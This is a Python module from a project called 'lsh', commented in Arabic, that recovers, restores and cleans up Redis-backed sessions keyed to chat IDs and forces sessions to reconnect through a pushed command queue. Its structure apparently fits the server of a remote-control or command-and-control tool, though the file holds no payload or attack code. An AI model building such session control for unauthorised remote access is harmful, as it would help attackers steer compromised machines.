# lsh/recovery.py
# ============================================================
# الاستعادة v6
# ============================================================

import json
import time
from .config import (
    redis_client, sessions, sessions_lock, LSH_CONFIG,
)
from .session_mgr import (
    create_session, get_session, session_exists, delete_session,
)
from .commands import clear_commands, push_command


# ============================================================
# استرجاع جلسة
# ============================================================
def recover_session(session_id):
    """استرجاع من Redis"""
    if not redis_client:
        return None

    try:
        chat_id = redis_client.get(f"lsh_session:{session_id}")
        if not chat_id:
            return None

        session = create_session(session_id, chat_id)

        # ★ استرجاع metadata
        meta_raw = redis_client.get(f"lsh_session_meta:{session_id}")
        if meta_raw:
            try:
                meta = json.loads(meta_raw)
                session["created_at"] = meta.get("created_at", time.time())
                session["reconnect_count"] = meta.get("reconnect_count", 0)
            except Exception:
                pass

        print(f"[+] Recovery: {session_id[:8]} recovered")
        return session
    except Exception as e:
        print(f"[-] Recovery error: {e}")
        return None


# ============================================================
# تنظيف
# ============================================================
def cleanup_stale_sessions():
    """حذف الجلسات الميتة"""
    if not redis_client:
        return 0

    try:
        count = 0
        cursor = 0
        while True:
            cursor, keys = redis_client.scan(
                cursor, match="lsh_session:*", count=100
            )
            for key in keys:
                try:
                    ttl = redis_client.ttl(key)
                    if ttl == -2:
                        redis_client.delete(key)
                        count += 1
                except Exception:
                    pass
            if cursor == 0:
                break

        if count > 0:
            print(f"[+] Recovery: cleaned {count} stale keys")
        return count
    except Exception as e:
        print(f"[-] cleanup_stale_sessions: {e}")
        return 0


# ============================================================
# استرجاع كل الجلسات
# ============================================================
def restore_all_sessions():
    """استرجاع عند البدء"""
    if not redis_client:
        return 0

    try:
        count = 0
        cursor = 0
        while True:
            cursor, keys = redis_client.scan(
                cursor, match="lsh_session:*", count=100
            )
            for key in keys:
                try:
                    sid = key.replace("lsh_session:", "")
                    chat_id = redis_client.get(key)
                    if chat_id and not session_exists(sid):
                        create_session(sid, chat_id)
                        count += 1
                except Exception:
                    pass
            if cursor == 0:
                break

        print(f"[+] Recovery: restored {count} sessions")
        return count
    except Exception as e:
        print(f"[-] restore_all_sessions: {e}")
        return 0


# ============================================================
# إعادة اتصال قسرية
# ============================================================
def force_reconnect(session_id):
    """إجبار جلسة على إعادة الاتصال"""
    try:
        # 1) امسح الأوامر القديمة
        clear_commands(session_id)

        # 2) ابعث أمر reconnect
        push_command(session_id, {"action": "force_reconnect"})

        # 3) حدّث الجلسة
        with sessions_lock:
            if session_id in sessions:
                sessions[session_id]["reconnect_count"] = 0
                sessions[session_id]["channel"] = "unknown"
                sessions[session_id]["presence"] = "reconnecting"

        print(f"[+] Force reconnect: {session_id[:8]}")
        return True
    except Exception as e:
        print(f"[-] force_reconnect: {e}")
        return False
